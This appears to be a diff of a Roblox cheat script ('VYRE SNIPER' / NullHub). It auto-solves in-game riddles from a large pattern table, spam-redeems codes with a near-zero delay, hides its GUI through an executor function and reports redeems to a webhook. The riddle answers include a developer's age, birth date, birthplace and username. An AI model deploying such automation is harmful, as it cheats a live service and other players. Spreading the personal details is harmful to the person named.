+        "what is the final og we added","whats the final og we added",
+    },a="JOHNPORK"},
     {p={"what is the fifth og","fifth og","5th og"},a="MEOWL"},
     {p={"how many og brainrots","og count"},a="FIVE"},
     {p={"unobtainable brainrot"},a="ORCHIDOX"},
@@ -825,6 +879,89 @@ local BRAINROT_KNOWLEDGE = {
     {p={"color of cyber"},a="BLUE"},
     {p={"color of phantom"},a="BLACK"},
     {p={"color of crystal"},a="BLUEPURPLE"},
+    -- ⭐ NEW: color riddles
+    {p={
+        -- strawberry elephant → RED
+        "what color is strawberry elephant","what colour is strawberry elephant",
+        "what color is the strawberry elephant","what colour is the strawberry elephant",
+        "what is the color of strawberry elephant","whats the color of strawberry elephant",
+        "what is the colour of strawberry elephant","whats the colour of strawberry elephant",
+        "what is the color of the strawberry elephant","whats the color of the strawberry elephant",
+        "what is the colour of the strawberry elephant","whats the colour of the strawberry elephant",
+        "which color is strawberry elephant","which colour is strawberry elephant",
+        "which color is the strawberry elephant","which colour is the strawberry elephant",
+        "color of strawberry elephant","colour of strawberry elephant",
+        "color of the strawberry elephant","colour of the strawberry elephant",
+        "the color of strawberry elephant","the colour of strawberry elephant",
+        "the color of the strawberry elephant","the colour of the strawberry elephant",
+        "strawberry elephant color","strawberry elephant colour",
+        "color strawberry elephant","colour strawberry elephant",
+        "color of strawberry elephant brainrot","colour of strawberry elephant brainrot",
+        "what is strawberry elephant color","whats strawberry elephant color",
+    },a="RED"},
+    {p={
+        -- johnpork → PINK
+        "what color is johnpork","what colour is johnpork",
+        "what color is john pork","what colour is john pork",
+        "what color is the johnpork","what colour is the johnpork",
+        "what color is the john pork","what colour is the john pork",
+        "what is the color of johnpork","whats the color of johnpork",
+        "what is the colour of johnpork","whats the colour of johnpork",
+        "what is the color of john pork","whats the color of john pork",
+        "what is the colour of john pork","whats the colour of john pork",
+        "what is the color of the johnpork","whats the color of the johnpork",
+        "what is the color of the john pork","whats the color of the john pork",
+        "which color is johnpork","which colour is johnpork",
+        "which color is john pork","which colour is john pork",
+        "which color is the johnpork","which colour is the johnpork",
+        "which color is the john pork","which colour is the john pork",
+        "color of johnpork","colour of johnpork",
+        "color of john pork","colour of john pork",
+        "color of the johnpork","colour of the johnpork",
+        "color of the john pork","colour of the john pork",
+        "the color of johnpork","the colour of johnpork",
+        "the color of john pork","the colour of john pork",
+        "johnpork color","johnpork colour","john pork color","john pork colour",
+        "color johnpork","colour johnpork","color john pork","colour john pork",
+        "what is johnpork color","whats johnpork color",
+        "what is john pork color","whats john pork color",
+    },a="PINK"},
+    {p={
+        -- skibidi toilet → WHITE
+        "what color is skibidi toilet","what colour is skibidi toilet",
+        "what color is the skibidi toilet","what colour is the skibidi toilet",
+        "what is the color of skibidi toilet","whats the color of skibidi toilet",
+        "what is the colour of skibidi toilet","whats the colour of skibidi toilet",
+        "what is the color of the skibidi toilet","whats the color of the skibidi toilet",
+        "what is the colour of the skibidi toilet","whats the colour of the skibidi toilet",
+        "which color is skibidi toilet","which colour is skibidi toilet",
+        "which color is the skibidi toilet","which colour is the skibidi toilet",
+        "color of skibidi toilet","colour of skibidi toilet",
+        "color of the skibidi toilet","colour of the skibidi toilet",
+        "the color of skibidi toilet","the colour of skibidi toilet",
+        "the color of the skibidi toilet","the colour of the skibidi toilet",
+        "skibidi toilet color","skibidi toilet colour",
+        "color skibidi toilet","colour skibidi toilet",
+        "what is skibidi toilet color","whats skibidi toilet color",
+    },a="WHITE"},
+    {p={
+        -- meowl → BROWN
+        "what color is meowl","what colour is meowl",
+        "what color is the meowl","what colour is the meowl",
+        "what is the color of meowl","whats the color of meowl",
+        "what is the colour of meowl","whats the colour of meowl",
+        "what is the color of the meowl","whats the color of the meowl",
+        "what is the colour of the meowl","whats the colour of the meowl",
+        "which color is meowl","which colour is meowl",
+        "which color is the meowl","which colour is the meowl",
+        "color of meowl","colour of meowl",
+        "color of the meowl","colour of the meowl",
+        "the color of meowl","the colour of meowl",
+        "the color of the meowl","the colour of the meowl",
+        "meowl color","meowl colour",
+        "color meowl","colour meowl",
+        "what is meowl color","whats meowl color",
+    },a="BROWN"},
     {p={"what number is gold"},a="1"},
     {p={"what number is diamond"},a="2"},
     {p={"what number is bloodrot"},a="3"},
@@ -859,6 +996,52 @@ local BRAINROT_KNOWLEDGE = {
     {p={"seventeenth machine","machine 17"},a="SUMMERFUSE"},
     {p={"eighteenth machine","machine 18"},a="LOSTRADERS"},
     {p={"how many machines"},a="18"},
+    -- ⭐ HOW MANY GAMES DID SAMMY MAKE → 8
+    {p={
+        -- exact / near-exact
+        "how many games did i make","how many games did sammy make","how many games have i made","how many games have you made",
+        "how many games did you make","how many games did the developer make","how many games did the developer made",
+        "how many games has sammy made","how many games has sammy made in total","how many games has the developer made",
+        "how many games did sammy made","how many games did i made","how many games i made","how many games i have made",
+        "how many games you made","how many games you have made","how many games we made","how many games have we made",
+        -- what / which question forms
+        "what is the number of games i made","whats the number of games i made","what is the number of games sammy made",
+        "whats the number of games sammy made","what is the number of games you made","whats the number of games you made",
+        "what number of games did i make","what number of games did sammy make","what number of games did you make",
+        "which number of games did i make","which number of games did sammy make",
+        "what is the total number of games i made","whats the total number of games i made","what is the total number of games sammy made",
+        "whats the total number of games sammy made","what is the total number of games you made","whats the total number of games you made",
+        -- total / count forms
+        "total games i made","total games sammy made","total games you made","total games made","total games made by sammy",
+        "total games made by the developer","total number of games","total number of games i made","total number of games sammy made","total number of games you made",
+        "how many total games did i make","how many total games did sammy make","how many total games did you make",
+        "how many total games i made","how many total games sammy made","how many total games you made",
+        "game count","games count","my game count","sammy game count","developer game count",
+        "how many games","how many games sammy","how many games did sammy create","how many games did i create","how many games did you create",
+        "how many games did sammy developed","how many games did i develop","how many games did you develop","how many games did sammy develop",
+        "how many games did sammy make in total","how many games did i make in total","how many games did you make in total",
+        "how many games did sammy made in total","how many games did i made in total","how many games did you made in total",
+        "how many roblox games did i make","how many roblox games did sammy make","how many roblox games did you make",
+        "how many roblox games did sammy made","how many roblox games did i made",
+        "how many roblox games has sammy made","how many roblox games has the developer made",
+        "how many roblox games did the developer make","how many roblox games did the developer made",
+        "how many games has the developer created","how many games has sammy created","how many games has he made",
+        "how many games did he make","how many games did he made","how many games has he created",
+        "number of games i made","number of games sammy made","number of games you made","number of games made",
+        "number of games made by sammy","number of games made by the developer","number of games the developer made",
+        -- other phrasings
+        "how many games are there","how many games in total","how many games in total did sammy make","how many games in total did i make",
+        "how many games has sammy developed","how many games has the developer developed",
+        "how many games have been made","how many games have been made by sammy","how many games have been made by the developer",
+        "how many projects did sammy make","how many projects did i make","how many projects did you make",
+        "how many games did sammy publish","how many games did i publish","how many games did you publish",
+        "how many games did the developer publish","how many games has sammy published","how many games has the developer published",
+        "games made count","games made","games i made","games sammy made","games you made","games developer made",
+        "how many games sammy made","how many games i made total","how many games sammy made total",
+        -- short
+        "how many games did you make total","how many games did he make total","how many games he made","how many games he made total",
+        "sammy games count","count of games made by sammy","count of games made by the developer",
+    },a="8"},
     {p={"first trait","trait 1"},a="LIGHTNING"},
     {p={"halo trait"},a="HALO"},
     {p={"bull trait"},a="BULL"},
@@ -874,10 +1057,50 @@ local BRAINROT_KNOWLEDGE = {
     {p={"how old is sammy","how old am i","what is my age","my age","sammy age","whats my age","age of sammy","age"},a="24"},
     {p={"what month is my birthday","my birthday month","which month is my birthday","birthday month","month of my birthday","what month was i born in"},a="FEBRUARY"},
     {p={"what day is my birthday","my birthday day","which day is my birthday","birthday day","day of my birthday","what day was i born"},a="24"},
-    {p={"what day and month is my birthday","when is my birthday","whats my birthday","what is my birthday","my full birthday","birthday"},a="FEBRUARY 24"},
+    {p={
+    -- original birthday patterns
+    "what day and month is my birthday","when is my birthday","whats my birthday","what is my birthday","my full birthday","birthday",
+    -- ⭐ birth date variations
+    "my birth date","my birthdate","my birth day date","my birth of date","my birth of dates","my date of birth","my d o b","my dob",
+    "what is my birth date","whats my birth date","what is my birthdate","whats my birthdate","what is my birth of date","whats my birth of date",
+    "what is my date of birth","whats my date of birth","what is my dob","whats my dob","what is my d o b","whats my d o b",
+    "tell me my birth date","tell me my birthdate","tell me my date of birth","tell me my dob",
+    "give me my birth date","give me my birthdate","give me my date of birth","give me my dob",
+    "sammy birth date","sammy birthdate","sammy birth of date","sammy date of birth","sammys birth date","sammys birthdate","sammys birth of date","sammys date of birth",
+    "what is sammys birth date","whats sammys birth date","what is sammys birth of date","whats sammys birth of date","what is sammys date of birth","whats sammys date of birth",
+    "when was i born date","what date was i born","what date was sammy born","which date was i born",
+    "my born date","my born of date","what is my born date","whats my born date",
+    "birth date","birthdate","date of birth","birth of date","dob","d o b",
+    "when is my birth date","when is my birthdate","when is my birth of date","when is my date of birth",
+    "my birthday date","my birthday of date","what is my birthday date","whats my birthday date",
+},a="FEBRUARY 24"},
     {p={"what year am i born","birth year","what year was i born","when was i born"},a="2002"},
     {p={"where was i born","birthplace","where was sammy born"},a="ALGERIA"},
-    {p={"where am i from","sammy country","my country","where is sammy from"},a="BRAZIL"},
+    {p={
+        -- exact / near-exact
+        "where am i from","where im from","where i am from","where i from",
+        "my country","what is my country","whats my country","which is my country","which country",
+        "what country am i from","what country i am from","what country im from","what country am i",
+        "which country am i from","which country i am from","which country am i in","what country am i in",
+        "what country do i live in","what country do you live in","which country do i live in","which country do you live in",
+        "what country do i live","which country do i live","what country do i stay in","what country do i stay",
+        -- location phrasings
+        "where am i located","where im located","where i am located","my location","what is my location","whats my location",
+        "where am i right now","where do i live","where do i currently live","where do i stay","where im at","where i am at","where i at",
+        "current location","my current location","my current country","whats my current country","where am i currently",
+        "which country am i currently in","what country am i currently in",
+        -- sammy direct
+        "sammy country","sammy from","where is sammy from","where sammy from","where sammy is from",
+        "what country is sammy from","which country is sammy from","what country is sammy","which country is sammy",
+        "what country does sammy live in","what country does sammy live","which country does sammy live in",
+        "sammy location","sammys country","sammys location","sammys home","sammy home",
+        "where does sammy live","where does sammy live in","where does sammy stay","where does sammy stay in",
+        "where do you live sammy","where do you stay sammy","where does the developer live","where does the developer stay",
+        -- country of origin
+        "my country of origin","country of origin","whats my country of origin","what is my country of origin",
+        -- short
+        "where i live","where i stay","where do i live in","country","my nation","my home country","home country","where am i",
+    },a="UNITEDSTATES"},
     {p={"nationality","what is my nationality"},a="BRAZILIAN"},
     {p={"state","city","what state am i from","what city am i from"},a="SAOPAULO"},
     {p={"roblox username","username","what is my username"},a="SPYDERSAMMY"},
@@ -1053,14 +1276,12 @@ do
     end
     local function findFirstMatch(txt)
         local normalized = normalizeRiddleText(txt)
-        local bestEntry, bestScore = nil, -1
+        local bestEntry, bestScore, bestPattern = nil, -1, nil
         for _, e in ipairs(BRAINROT_KNOWLEDGE) do
             for _, pt in ipairs(e.p) do
                 if riddleMatch(normalized, pt) then
-                    -- count significant words in pattern
                     local score = 0
                     for _ in pairs(riddleWords(pt)) do score = score + 1 end
-                    -- exact match (pattern words == message significant words) wins outright
                     local msgWords = riddleWords(normalized)
                     local msgCount = 0
                     for _ in pairs(msgWords) do msgCount = msgCount + 1 end
@@ -1068,12 +1289,13 @@ do
                     if score > bestScore then
                         bestScore = score
                         bestEntry = e
+                        bestPattern = pt
                     end
                 end
             end
         end
-        if bestEntry then return bestEntry.a:gsub("%s+",""):upper(), bestEntry.a end
-        return nil, nil
+        if bestEntry then return bestEntry.a:gsub("%s+",""):upper(), bestEntry.a, bestPattern end
+        return nil, nil, nil
     end
     function Riddle.solve(message)
         if not message or message=="" then return nil end
@@ -1108,12 +1330,13 @@ do
             end
         end
         if #pieces <= 1 then
-            local baseAnswer, originalAnswer = findFirstMatch(message)
+            local baseAnswer, originalAnswer, matchedPat = findFirstMatch(message)
             if not baseAnswer then return nil end
             local numsInAnswer = {}
             local local_hadDigit = false
             for num in tostring(originalAnswer):gmatch("%d+") do numsInAnswer[num] = true; local_hadDigit = true end
             if local_hadDigit then return baseAnswer end
+            if matchedPat and matchedPat:find("%d") then return baseAnswer end
             local suffix
             for num in tostring(message):gmatch("%d+") do if not numsInAnswer[num] then suffix = num end end
             if suffix and #suffix > 0 then return baseAnswer..suffix end
@@ -1143,7 +1366,7 @@ do
         local l = text:lower():gsub("%s+", " ")
         local hasQuestion = l:find("%?") ~= nil
         local startsWithQ = l:match("^%s*(what%s+is)") or l:match("^%s*(whats)") or l:match("^%s*(who)") or l:match("^%s*(where)") or l:match("^%s*(when)") or l:match("^%s*(how%s+many)") or l:match("^%s*(which)") or l:match("^%s*(first)") or l:match("^%s*(second)") or l:match("^%s*(third)") or l:match("^%s*(fourth)") or l:match("^%s*(fifth)") or l:match("^%s*(last)") or l:match("^%s*(newest)") or l:match("^%s*(best)") or l:match("^%s*(rarest)") or l:match("^%s*(today)") or l:match("^%s*(name)") or l:match("^%s*(month)") or l:match("^%s*(day)") or l:match("^%s*(holiday)") or l:match("^%s*(tomorrow)") or l:match("^%s*(skin)") or l:match("^%s*(age)") or l:match("^%s*(birthday)") or l:match("^%s*(favorite)") or l:match("^%s*(phoenix)")
-        local hasKeyword = l:find("og",1,true) or l:find("mutation",1,true) or l:find("machine",1,true) or l:find("brainrot",1,true) or l:find("color",1,true) or l:find("favorite",1,true) or l:find("fav",1,true) or l:find("name",1,true) or l:find("age",1,true) or l:find("birthday",1,true) or l:find("country",1,true) or l:find("rarity",1,true) or l:find("trait",1,true) or l:find("sammy",1,true) or l:find("developer",1,true) or l:find("creator",1,true) or l:find("owner",1,true) or l:find("game",1,true) or l:find("secret",1,true) or l:find("admin",1,true) or l:find("sab",1,true) or l:find("steal",1,true) or l:find("pet",1,true) or l:find("cat",1,true) or l:find("kitty",1,true) or l:find("sport",1,true) or l:find("food",1,true) or l:find("animal",1,true) or l:find("username",1,true) or l:find("city",1,true) or l:find("nationality",1,true) or l:find("year",1,true) or l:find("month",1,true) or l:find("day",1,true) or l:find("today",1,true) or l:find("date",1,true) or l:find("planet",1,true) or l:find("earth",1,true) or l:find("goat",1,true) or l:find("taco",1,true) or l:find("rebirth",1,true) or l:find("fuse",1,true) or l:find("griffin",1,true) or l:find("craft",1,true) or l:find("multiplier",1,true) or l:find("earn",1,true) or l:find("item",1,true) or l:find("phoenix",1,true) or l:find("rarest",1,true) or l:find("rare",1,true) or l:find("skin",1,true) or l:find("colour",1,true) or l:find("color",1,true) or l:find("tone",1,true) or l:find("last name",1,true) or l:find("surname",1,true) or l:find("device",1,true) or l:find("laptop",1,true) or l:find(" pc",1,true) or l:find("computer",1,true) or l:find("phone",1,true) or l:find("mobile",1,true) or l:find("tablet",1,true) or l:find("ipad",1,true) or l:find("iphone",1,true) or l:find("desktop",1,true) or l:find("macbook",1,true) or l:find("chromebook",1,true) or l:find("console",1,true) or l:find("xbox",1,true) or l:find("playstation",1,true) or l:find("nintendo",1,true) or l:find("using",1,true) or l:find("playing",1,true) or l:find("location",1,true) or l:find("live",1,true) or l:find("luck",1,true) or l:find("event",1,true) or l:find("action",1,true) or l:find("state",1,true) or l:find("reason",1,true) or l:find("amount",1,true) or l:find("count",1,true)
+        local hasKeyword = l:find("og",1,true) or l:find("mutation",1,true) or l:find("machine",1,true) or l:find("brainrot",1,true) or l:find("color",1,true) or l:find("favorite",1,true) or l:find("fav",1,true) or l:find("name",1,true) or l:find("age",1,true) or l:find("birthday",1,true) or l:find("country",1,true) or l:find("rarity",1,true) or l:find("trait",1,true) or l:find("sammy",1,true) or l:find("developer",1,true) or l:find("creator",1,true) or l:find("owner",1,true) or l:find("game",1,true) or l:find("secret",1,true) or l:find("admin",1,true) or l:find("sab",1,true) or l:find("steal",1,true) or l:find("pet",1,true) or l:find("cat",1,true) or l:find("kitty",1,true) or l:find("sport",1,true) or l:find("food",1,true) or l:find("animal",1,true) or l:find("username",1,true) or l:find("city",1,true) or l:find("nationality",1,true) or l:find("year",1,true) or l:find("month",1,true) or l:find("day",1,true) or l:find("today",1,true) or l:find("date",1,true) or l:find("planet",1,true) or l:find("earth",1,true) or l:find("goat",1,true) or l:find("taco",1,true) or l:find("rebirth",1,true) or l:find("fuse",1,true) or l:find("griffin",1,true) or l:find("craft",1,true) or l:find("multiplier",1,true) or l:find("earn",1,true) or l:find("item",1,true) or l:find("phoenix",1,true) or l:find("rarest",1,true) or l:find("rare",1,true) or l:find("skin",1,true) or l:find("colour",1,true) or l:find("color",1,true) or l:find("tone",1,true) or l:find("last name",1,true) or l:find("surname",1,true) or l:find("device",1,true) or l:find("laptop",1,true) or l:find(" pc",1,true) or l:find("computer",1,true) or l:find("phone",1,true) or l:find("mobile",1,true) or l:find("tablet",1,true) or l:find("ipad",1,true) or l:find("iphone",1,true) or l:find("desktop",1,true) or l:find("macbook",1,true) or l:find("chromebook",1,true) or l:find("console",1,true) or l:find("xbox",1,true) or l:find("playstation",1,true) or l:find("nintendo",1,true) or l:find("using",1,true) or l:find("playing",1,true) or l:find("location",1,true) or l:find("live",1,true) or l:find("luck",1,true) or l:find("event",1,true) or l:find("action",1,true) or l:find("state",1,true) or l:find("reason",1,true) or l:find("amount",1,true) or l:find("count",1,true) or l:find("minifigure",1,true) or l:find("minifigures",1,true) or l:find("series",1,true) or l:find("toy",1,true)
         local isSabRiddle = l:find("sab",1,true) or l:find("release",1,true) or l:find("steal",1,true)
         -- ⭐ NEW: check for question words ANYWHERE in message (not just at start)
         local hasInnerQ = l:find("%f[%a]what%f[%A]") or l:find("%f[%a]where%f[%A]") or l:find("%f[%a]who%f[%A]") or l:find("%f[%a]which%f[%A]") or l:find("%f[%a]when%f[%A]") or l:find("%f[%a]how%f[%A]") or l:find("%f[%a]why%f[%A]")
@@ -1173,7 +1396,6 @@ do
     local HOLIDAYS = {"christmas","easter","halloween","newyear","thanksgiving","valentine","birthday"}
         -- ⭐ Location words (countries / cities / places)
     local LOCATION_WORDS = {
-        -- Countries
         spain=true, brazil=true, algeria=true, france=true, italy=true, germany=true,
         usa=true, america=true, uk=true, england=true, scotland=true, wales=true, ireland=true,
         japan=true, china=true, india=true, canada=true, mexico=true, argentina=true,
@@ -1182,17 +1404,14 @@ do
         denmark=true, finland=true, poland=true, ukraine=true, romania=true, hungary=true,
         thailand=true, vietnam=true, korea=true, malaysia=true, indonesia=true, philippines=true,
         pakistan=true, bangladesh=true, saudi=true, dubai=true, uae=true, qatar=true, kuwait=true,
-        -- Cities
         london=true, paris=true, madrid=true, barcelona=true, tokyo=true, delhi=true,
         mumbai=true, beijing=true, shanghai=true, cairo=true, dubai=true, istanbul=true,
         moscow=true, berlin=true, rome=true, lisbon=true, saopaulo=true, rio=true,
         newyork=true, nyc=true, losangeles=true, chicago=true, houston=true, miami=true,
         toronto=true, vancouver=true, sydney=true, melbourne=true, singapore=true,
         bangkok=true, hongkong=true, seoul=true, jakarta=true, manila=true,
-        -- Regions / common
         europe=true, asia=true, africa=true, america=true, europe=true, antarctica=true,
         texas=true, california=true, florida=true, quebec=true, ontario=true,
-        -- Specific to the game/community
         brazil=true, algeria=true,
     }
     local function up(s) return tostring(s or ""):upper() end
@@ -1263,7 +1482,6 @@ do
             else if addFact("LOCATION", loc, "location") then pushLearned(learned, "LOCATION", up(loc)) end end
             return true
         end
-        -- ⭐ FALLBACK: scan whole sentence for any known location word
         for lw in pairs(LOCATION_WORDS) do
             if l:find("%f[%a]"..lw.."%f[%A]") then
                 if addFact("LOCATION", lw, "location-scan") then
@@ -1520,10 +1738,17 @@ end
 
 local Chk = {}
 do
-    local BLACKLISTED_PHRASES = {"sammy has spawned","sammy spawned","invalid code","font color","coins shop","brainrot trader","robux shop","spin wheel","trade plaza","event has started","to buy this","your base is already locked","you locked your base for","broke into your base","someone is stealing","trade has been completed"}
+    -- ⭐ FIX: riddle-like text ko blacklist se exempt karo
+    local BLACKLISTED_PHRASES = {"sammy has spawned","sammy spawned","invalid code","font color","coins shop","brainrot trader","robux shop","spin wheel","event has started","to buy this","your base is already locked","you locked your base for","broke into your base","someone is stealing","trade has been completed"}
     for _, m in ipairs(SOLD_OUT_MARKERS) do table.insert(BLACKLISTED_PHRASES, m) end
     function Chk.isBlacklisted(text)
         local lowered = tostring(text or ""):lower():gsub("%s+", " ")
+        -- ⭐ riddle patterns never blacklisted
+        if lowered:find("when was", 1, true) or lowered:find("what is", 1, true) or lowered:find("whats", 1, true)
+           or lowered:find("which", 1, true) or lowered:find("how many", 1, true) or lowered:find("where", 1, true)
+           or lowered:find("who is", 1, true) then
+            return false
+        end
         for _, phrase in ipairs(BLACKLISTED_PHRASES) do if lowered:find(phrase, 1, true) then return true end end
         return false
     end
@@ -1631,10 +1856,8 @@ do
     function Webhook.sendRedeem(code, brainrotName, income, redeemType, riddleText)
         if not WEBHOOK_ENABLED then return end
         if isSoldOutOrInvalid(code) or isSoldOutOrInvalid(brainrotName or "") then return end
-        -- skip unknown brainrot for code redeems
         if redeemType ~= "Riddle" and (not brainrotName or brainrotName == "" or brainrotName:lower() == "unknown") then return end
-        -- dedup
-        local key = (redeemType or "Code") .. "|" .. (brainrotName or "") .. "|" .. (tostring(income or "")) 
+        local key = (redeemType or "Code") .. "|" .. (brainrotName or "") .. "|" .. (tostring(income or ""))
         cleanRecent()
         if recent[key] then return end
         recent[key] = os.clock()
@@ -1710,7 +1933,7 @@ end
 
 local RB = {}
 do
-    local _spamRedeem, _spamCount, SPAM_DELAY = true, 15, 0.06
+    local _spamRedeem, _spamCount, SPAM_DELAY = true, 22, 000000000000.0000000000001
     local function isOurGui(instance)
         local p, n = instance, 0
         while p and n < 10 do if p.Name == "NullHub" then return true end; p = p.Parent; n = n + 1 end
@@ -1907,16 +2130,16 @@ local lastAutoEnable, _webhookStartupSent = 0, false
 -- COLORS + HELPERS (v20 BLUE theme)
 ----------------------------------------------------------------------
 local C = {
-    bg=Color3.fromRGB(10, 15, 26), card=Color3.fromRGB(20, 26, 44),
-    cardBorder=Color3.fromRGB(60, 140, 240), headerBg=Color3.fromRGB(16, 22, 38),
-    pillBg=Color3.fromRGB(28, 38, 58), txt=Color3.fromRGB(240, 245, 255),
-    sub=Color3.fromRGB(160, 180, 215), dim=Color3.fromRGB(100, 120, 155),
-    accent=Color3.fromRGB(70, 160, 255), accent2=Color3.fromRGB(130, 190, 255),
-    toggleOn=Color3.fromRGB(70, 160, 255), toggleOff=Color3.fromRGB(38, 48, 72),
-    knobOn=Color3.fromRGB(255, 255, 255), knobOff=Color3.fromRGB(130, 150, 180),
-    green=Color3.fromRGB(100, 245, 160), red=Color3.fromRGB(255, 100, 130),
-    yellow=Color3.fromRGB(255, 210, 100), inputBg=Color3.fromRGB(7, 11, 20),
-    codeBg=Color3.fromRGB(5, 9, 18), btnDark=Color3.fromRGB(26, 34, 52),
+    bg=Color3.fromRGB(6, 6, 9), card=Color3.fromRGB(18, 18, 24),
+    cardBorder=Color3.fromRGB(200, 200, 215), headerBg=Color3.fromRGB(12, 12, 16),
+    pillBg=Color3.fromRGB(30, 30, 38), txt=Color3.fromRGB(245, 245, 250),
+    sub=Color3.fromRGB(200, 200, 215), dim=Color3.fromRGB(120, 120, 135),
+    accent=Color3.fromRGB(210, 210, 225), accent2=Color3.fromRGB(240, 240, 250),
+    toggleOn=Color3.fromRGB(200, 200, 215), toggleOff=Color3.fromRGB(38, 38, 46),
+    knobOn=Color3.fromRGB(255, 255, 255), knobOff=Color3.fromRGB(140, 140, 155),
+    green=Color3.fromRGB(210, 210, 225), red=Color3.fromRGB(255, 120, 140),
+    yellow=Color3.fromRGB(230, 225, 190), inputBg=Color3.fromRGB(8, 8, 12),
+    codeBg=Color3.fromRGB(4, 4, 7), btnDark=Color3.fromRGB(26, 26, 34),
 }
 
 local FM, FB, FBK = Enum.Font.GothamMedium, Enum.Font.GothamBold, Enum.Font.GothamBlack
@@ -1929,7 +2152,11 @@ local function new(cls, props, parent)
 end
 local function corner(o, r) new("UICorner", { CornerRadius = UDim.new(1, 0) }, o) end
 local function cornerP(o, r) new("UICorner", { CornerRadius = UDim.new(0, r or 10) }, o) end
-local function stroke(o, col, th, tr) return new("UIStroke", { Color = col or C.cardBorder, Thickness = th or 1, Transparency = tr or 0.4, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, o) end
+local function stroke(o, col, th, tr)
+    local inner = new("UIStroke", { Color = Color3.fromRGB(10, 10, 14), Thickness = (th or 1) + 1, Transparency = (tr or 0.4) * 0.5, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, o)
+    local outer = new("UIStroke", { Color = col or C.cardBorder, Thickness = th or 1, Transparency = tr or 0.4, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, o)
+    return outer
+end
 local function tween(o, t, goal, style) TweenService:Create(o, TweenInfo.new(t, style or Enum.EasingStyle.Quad), goal):Play() end
 local function label(text, size, col, font, xa, parent)
     return new("TextLabel", { BackgroundTransparency=1, Text=text, Font=font or FM, TextSize=size or 12, TextColor3=col or C.txt, TextXAlignment=xa or Enum.TextXAlignment.Left }, parent)
@@ -2036,7 +2263,6 @@ do
             end
         end)
     end
-    -- subtle smooth stagger (no bubble shake)
     function AnimH.softStagger(container, fromY)
         fromY = fromY or 12
         local idx = 0
@@ -2059,7 +2285,6 @@ do
             end
         end
     end
-    -- subtle scale pop for answer box
     function AnimH.popIn(obj)
         local s = obj:FindFirstChildOfClass("UIScale") or new("UIScale", {Scale = 1}, obj)
         s.Scale = 0.92
@@ -2073,7 +2298,22 @@ end
 local UI
 local function buildUI()
     local U = {}
-    local parentGui = (_gethui and _gethui()) or PG
+    local function resolveUIParent()
+    if _gethui then
+        local ok, hui = pcall(_gethui)
+        if ok and typeof(hui) == "Instance" and hui ~= game then
+            local canParent = pcall(function()
+                local probe = Instance.new("Folder")
+                probe.Parent = hui
+                probe:Destroy()
+            end)
+            if canParent then return hui end
+        end
+    end
+    return PG
+end
+
+    local parentGui = resolveUIParent()
     local old = parentGui:FindFirstChild("NullHub"); if old then old:Destroy() end
     local SG = new("ScreenGui", { Name="NullHub", ResetOnSpawn=false, ZIndexBehavior=Enum.ZIndexBehavior.Sibling, DisplayOrder=250 }, parentGui)
     U.SG = SG
@@ -2085,21 +2325,21 @@ local function buildUI()
     local main = new("Frame", { Name="Main", Size=UDim2.fromOffset(BAR_W, BAR_H), AnchorPoint=Vector2.new(0.5,0), Position=UDim2.new(0.5,0,0,10), BackgroundColor3=C.bg, BorderSizePixel=0, ClipsDescendants=true, ZIndex=1 }, SG)
     U.main = main
     U.mainScale = new("UIScale", { Scale = 0.35 }, main)
-    cornerP(main, 14); stroke(main, C.cardBorder, 1.4, 0.3)
+    cornerP(main, 14); stroke(main, C.cardBorder, 1.4, 0.25)
+local mainShine = new("UIStroke", { Color = Color3.fromRGB(0, 0, 0), Thickness = 4, Transparency = 0.35, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, main)
+AnimH.pulse(mainShine, "Transparency", 0.35, 0.65, 1.6)
 
-    -- ⭐ Background image
     local bgImage = new("ImageLabel", {
         Name = "BgImage",
         Size = UDim2.fromScale(1, 1),
         BackgroundTransparency = 1,
-        Image = "rbxassetid://78888420795161",
-        ImageTransparency = 0.20,
+        Image = "rbxassetid://106269036472822",
+        ImageTransparency = 0.30,
         ScaleType = Enum.ScaleType.Fit,
         ZIndex = 0,
     }, main)
     cornerP(bgImage, 14)
 
-    -- Gradient overlay on top of image
     local gradFrame = new("Frame", { Size=UDim2.fromScale(1,1), BackgroundColor3=C.bg, BackgroundTransparency = 0.4, BorderSizePixel=0, ZIndex=0 }, main)
     cornerP(gradFrame, 14)
     new("UIGradient", { Rotation = 135, Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 38, 68)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 10, 20)) }) }, gradFrame)
@@ -2113,12 +2353,14 @@ local function buildUI()
     local dragHandle = new("Frame", { Size=UDim2.new(1,0,0,HDR_H), BackgroundTransparency=1, BorderSizePixel=0, ZIndex=4 }, header)
     drag(dragHandle, main)
 
-    local logoCircle = new("ImageLabel", { Size=UDim2.fromOffset(22,22), Position=UDim2.fromOffset(10,6), BackgroundTransparency=1, Image="rbxassetid://78888420795161", ScaleType=Enum.ScaleType.Crop, ZIndex=5 }, header)
+    local logoCircle = new("ImageLabel", { Size=UDim2.fromOffset(22,22), Position=UDim2.fromOffset(10,6), BackgroundTransparency=1, Image="rbxassetid://106269036472822", ScaleType=Enum.ScaleType.Crop, ZIndex=5 }, header)
     corner(logoCircle)
     AnimH.pulse(logoCircle, "ImageTransparency", 0, 0.25, 1.4)
     task.delay(0.3, function() AnimH.float(logoCircle, 1.5, 2) end)
 
     local titleLbl = label("VYRE SNIPER", 12, C.txt, FBK, Enum.TextXAlignment.Left, header)
+    new("UIStroke", { Color = Color3.fromRGB(0, 0, 0), Thickness = 2.5, Transparency = 0.1, ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual }, titleLbl)
+new("UIStroke", { Color = Color3.fromRGB(230, 230, 245), Thickness = 1, Transparency = 0.3, ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual }, titleLbl)
     titleLbl.Size = UDim2.fromOffset(180,14); titleLbl.Position = UDim2.fromOffset(40,4); titleLbl.ZIndex=5
     local titleSub = label("#1 CODE SNIPER", 8, C.accent2, FM, Enum.TextXAlignment.Left, header)
     titleSub.Size = UDim2.fromOffset(180,10); titleSub.Position = UDim2.fromOffset(40,19); titleSub.ZIndex=5
@@ -2368,7 +2610,6 @@ local function buildUI()
     cornerP(inlineRandomTest, 6); stroke(inlineRandomTest, C.cardBorder, 1, 0.5); AnimH.button(inlineRandomTest)
     U.inlineRandomTest = inlineRandomTest
 
-    -- ⭐ tab switch: SMOOTH fade (no shake/wobble)
     local function setActiveTab(key)
         local pages = { main = mainPage, console = consolePage, settings = settingsPage }
